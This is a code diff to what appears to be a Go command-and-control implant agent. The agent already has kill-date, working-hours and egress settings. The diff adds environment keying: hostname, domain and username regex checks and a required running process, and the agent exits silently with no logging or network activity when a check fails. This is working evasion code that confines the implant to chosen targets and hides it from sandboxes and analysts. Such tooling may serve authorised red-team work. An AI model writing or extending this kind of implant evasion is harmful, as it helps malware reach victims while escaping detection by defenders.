@@ -9,6 +9,7 @@ import (
 	"net"
 	"os"
 	"os/signal"
+	"regexp"
 	"runtime"
 	"strconv"
 	"strings"
@@ -49,6 +50,10 @@ var (
 	workingHoursEnd   string = ""     // Working hours end (HH:MM, 24hr local time)
 	workingDays       string = ""     // Active days (1-7, Mon=1, Sun=7, comma-separated)
 	tcpBindAddress    string = ""     // TCP P2P bind address (e.g., "0.0.0.0:7777"). Empty = HTTP egress mode.
+	envKeyHostname    string = ""     // Environment key: hostname must match this regex
+	envKeyDomain      string = ""     // Environment key: domain must match this regex
+	envKeyUsername    string = ""     // Environment key: username must match this regex
+	envKeyProcess     string = ""     // Environment key: this process must be running
 )
 
 func main() {
@@ -102,6 +107,11 @@ func runAgent() {
 	// Check kill date
 	if killDateInt64 > 0 && time.Now().Unix() > killDateInt64 {
 		log.Printf("[INFO] Agent past kill date, exiting")
+		os.Exit(0)
+	}
+
+	// Check environment keys — exit silently if any check fails (no network activity)
+	if !checkEnvironmentKeys() {
 		os.Exit(0)
 	}
 
@@ -524,4 +534,46 @@ func getInternalIP() string {
 		}
 	}
 	return "127.0.0.1"
+}
+
+// checkEnvironmentKeys validates all configured environment keys.
+// Returns true if all checks pass (or no keys configured). Returns false if any check fails.
+// On failure, the agent should exit silently — no logging, no network activity.
+func checkEnvironmentKeys() bool {
+	if envKeyHostname != "" {
+		hostname, _ := os.Hostname()
+		if !regexMatch(envKeyHostname, hostname) {
+			return false
+		}
+	}
+	if envKeyDomain != "" {
+		domain := getEnvironmentDomain()
+		if !regexMatch(envKeyDomain, domain) {
+			return false
+		}
+	}
+	if envKeyUsername != "" {
+		username := getUsername()
+		if !regexMatch(envKeyUsername, username) {
+			return false
+		}
+	}
+	if envKeyProcess != "" {
+		if !isProcessRunning(envKeyProcess) {
+			return false
+		}
+	}
+	return true
+}
+
+// regexMatch performs a case-insensitive full-string regex match.
+func regexMatch(pattern, value string) bool {
+	// Anchor the pattern to match the full string
+	anchored := "(?i)^(?:" + pattern + ")$"
+	re, err := regexp.Compile(anchored)
+	if err != nil {
+		// Invalid regex — fail closed (don't execute)
+		return false
+	}
+	return re.MatchString(value)
 }
